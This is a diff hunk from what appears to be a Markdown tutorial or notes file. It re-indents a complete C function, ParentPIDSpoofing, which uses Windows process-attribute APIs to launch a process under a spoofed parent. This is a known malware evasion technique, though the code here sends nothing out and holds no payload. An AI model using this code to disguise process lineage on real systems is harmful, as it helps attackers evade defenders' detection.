@@ -123,34 +123,34 @@ parameters:
 
 ```c
 
-BOOL ParentPIDSpoofing(handle hprocess, LPWSTR newprocessname, HANDLE* hnewprocess, DWORD *dwnewPID) {
- STARTUPINFOEXW SI = { 0 };
- PROCESS_INFORMATION PI = { 0 };
- SI.StartupInfo.cb = sizeof(STARTUPINFOW);
- SIZE_T Attributelist = 0;
- SI.StartupInfo.cb = sizeof(STARTUPINFOEXW);
- InitializeProcThreadAttributeList(NULL, 1, 0, &Attributelist);
- SI.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Attributelist);
- if (SI.lpAttributeList == NULL) {
-  printf("Heap alloc failed with error no %x\n", GetLastError());
-  return FALSE;
- }
- if (!InitializeProcThreadAttributeList(SI.lpAttributeList, 1, 0, &Attributelist)) {
-  printf("InitializeProcThreadAttirbuteList failed with error no %x\n", GetLastError());
-  return FALSE;
- }
- if (!UpdateProcThreadAttribute(SI.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hprocess, sizeof(hprocess), NULL, NULL)) {
-  printf("UpdateProcThreadAttirbute failed with error no %x\n", GetLastError());
-  return FALSE;
- }
- if (!CreateProcessW(NULL, newprocessname, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &SI.StartupInfo, &PI)) {
-  printf("The CreateprocessW failed with error no %x\n", GetLastError());
-  return FALSE;
- }
- *hnewprocess = PI.hProcess;
- *dwnewPID = PI.dwProcessId;
- return TRUE;
-}
+    BOOL ParentPIDSpoofing(handle hprocess, LPWSTR newprocessname, HANDLE* hnewprocess, DWORD *dwnewPID) {
+    STARTUPINFOEXW SI = { 0 };
+    PROCESS_INFORMATION PI = { 0 };
+    SI.StartupInfo.cb = sizeof(STARTUPINFOW);
+    SIZE_T Attributelist = 0;
+    SI.StartupInfo.cb = sizeof(STARTUPINFOEXW);
+    InitializeProcThreadAttributeList(NULL, 1, 0, &Attributelist);
+    SI.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Attributelist);
+    if (SI.lpAttributeList == NULL) {
+    printf("Heap alloc failed with error no %x\n", GetLastError());
+    return FALSE;
+    }
+    if (!InitializeProcThreadAttributeList(SI.lpAttributeList, 1, 0, &Attributelist)) {
+    printf("InitializeProcThreadAttirbuteList failed with error no %x\n", GetLastError());
+    return FALSE;
+    }
+    if (!UpdateProcThreadAttribute(SI.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hprocess, sizeof(hprocess), NULL, NULL)) {
+    printf("UpdateProcThreadAttirbute failed with error no %x\n", GetLastError());
+    return FALSE;
+    }
+    if (!CreateProcessW(NULL, newprocessname, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &SI.StartupInfo, &PI)) {
+    printf("The CreateprocessW failed with error no %x\n", GetLastError());
+    return FALSE;
+    }
+    *hnewprocess = PI.hProcess;
+    *dwnewPID = PI.dwProcessId;
+    return TRUE;
+    }
 ```
 
 
